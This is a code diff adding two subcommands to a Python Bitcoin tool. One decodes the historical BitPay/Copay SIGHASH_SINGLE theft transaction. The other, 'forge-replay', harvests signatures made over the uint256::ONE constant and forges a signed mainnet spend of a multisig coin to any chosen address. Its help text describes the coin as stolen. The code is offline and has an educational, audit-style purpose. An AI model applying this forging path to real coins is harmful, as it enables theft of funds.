@@ -224,6 +224,43 @@ def build_parser() -> argparse.ArgumentParser:
     attack.add_argument('--destination', default='', help='attacker payout address')
     attack.add_argument('--json', action='store_true')
 
+    replay = subparsers.add_parser(
+        'replay-history',
+        help='audit the real BitPay/Copay SIGHASH_SINGLE theft transaction',
+        description=(
+            'Decode the mainnet transaction that drained 0.059672 BTC from the '
+            '2-of-3 P2SH address 32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe, show that '
+            'its signatures were made over the uint256::ONE constant instead of '
+            'a transaction digest, and rebuild a forgery from them. Offline: the '
+            'transaction is built in and never broadcast.'
+        ),
+    )
+    replay.add_argument('--json', action='store_true')
+
+    forge = subparsers.add_parser(
+        'forge-replay',
+        help='spend a multisig coin using SIGHASH_SINGLE signatures from another tx',
+        description=(
+            'Harvest SIGHASH_SINGLE signatures that were signed over the '
+            'uint256::ONE constant from an existing transaction, then reuse them '
+            'to spend the same coin to any address you choose. Offline: prints a '
+            'signed transaction, never broadcasts it.'
+        ),
+    )
+    forge.add_argument(
+        '--from-tx',
+        default=None,
+        help='hex of the transaction to harvest signatures from '
+        '(default: the historical BitPay/Copay transaction)',
+    )
+    forge.add_argument('--txid', required=True, help='txid of the coin being spent')
+    forge.add_argument('--vout', type=int, default=0, help='output index (default 0)')
+    forge.add_argument('--value', type=int, required=True, help='value of that output, sats')
+    forge.add_argument('--to', required=True, help='address to send the stolen coin to')
+    forge.add_argument('--fee', type=int, default=1000, help='fee in satoshis (default 1000)')
+    forge.add_argument('--network', default='mainnet', choices=sorted(_CHAINS))
+    forge.add_argument('--json', action='store_true')
+
     scriptsig = subparsers.add_parser(
         'scriptsig', help='decode a scriptSig (as printed by the reference tooling)'
     )
@@ -662,6 +699,113 @@ def _signraw(args) -> int:
         return _fail(exc)
     _report_built(built, args.json)
     return 0
+
+
+def _replay_history(args) -> int:
+    from .sighash_single import replay_history
+
+    try:
+        result = replay_history()
+    except ValueError as exc:
+        return _fail(exc)
+
+    if args.json:
+        print(
+            json.dumps(
+                {
+                    'txid': result.txid,
+                    'inputs': result.inputs,
+                    'outputs': result.outputs,
+                    'value_stolen': result.value_stolen,
+                    'victim': result.victim_address,
+                    'attacker': result.attacker_address,
+                    'redeem_script': result.redeem_script.hex(),
+                    'harvested': [
+                        {
+                            'input_index': h.input_index,
+                            'signature': h.signature_hex,
+                            'sighash_type': h.sighash_type,
+                            'digest': str(h.digest),
+                            'verifying_key_indices': h.verifying_keys,
+                        }
+                        for h in result.harvests
+                    ],
+                    'sighash_all_digests': [str(d) for d in result.all_sighash_digests],
+                },
+                indent=2,
+            )
+        )
+        return 0
+
+    print('The BitPay/Copay SIGHASH_SINGLE theft\n')
+    print(result.report())
+    print()
+    print('The signatures above were made for a transaction that was never')
+    print('broadcast. They commit to the constant uint256::ONE, not to this')
+    print('transaction, so whoever held them could spend the coin to any address.')
+    print('That is exactly what this transaction did.')
+    return 0
+
+
+def _forge_replay(args) -> int:
+    from .sighash_single import (
+        forge_from_harvest,
+        harvest_signatures,
+        replay_history,
+    )
+    from .wallet import parse_transaction_hex
+
+    try:
+        if args.from_tx:
+            source = parse_transaction_hex(args.from_tx)
+        else:
+            source = replay_history().transaction
+        harvests = harvest_signatures(source)
+        if not harvests:
+            return _fail(
+                ValueError(
+                    'no SIGHASH_SINGLE signatures over the constant digest were '
+                    'found in that transaction; there is nothing to replay'
+                )
+            )
+        forged = forge_from_harvest(
+            harvests,
+            prev_txid=args.txid,
+            prev_vout=args.vout,
+            destination=args.to,
+            value=args.value,
+            network=args.network,
+            fee=args.fee,
+        )
+    except ValueError as exc:
+        return _fail(exc)
+
+    if args.json:
+        print(
+            json.dumps(
+                {
+                    'txid': forged.transaction.txid(),
+                    'hex': forged.transaction.hex(),
+                    'script_sig': forged.script_sig.hex(),
+                    'digest': str(forged.digest_used),
+                    'valid': forged.valid,
+                    'destination': args.to,
+                    'value': args.value - args.fee,
+                    'harvested_from': source.txid(),
+                },
+                indent=2,
+            )
+        )
+        return 0
+
+    print('harvested %d signature(s) from %s' % (len(harvests), source.txid()))
+    print()
+    print(forged.report())
+    print()
+    print('This transaction spends the coin without any key holder having signed')
+    print('it. It is printed, not broadcast.')
+    return 0
+
 
 
 def _decode(args) -> int:
@@ -1353,6 +1497,8 @@ _HANDLERS = {
     'balance': _balance,
     'broadcast': _broadcast,
     'sighash-single-demo': _analyse,
+    'replay-history': _replay_history,
+    'forge-replay': _forge_replay,
     'scriptsig': _scriptsig,
     'redeemscript': _redeemscript,
     'pubkey': _pubkey,
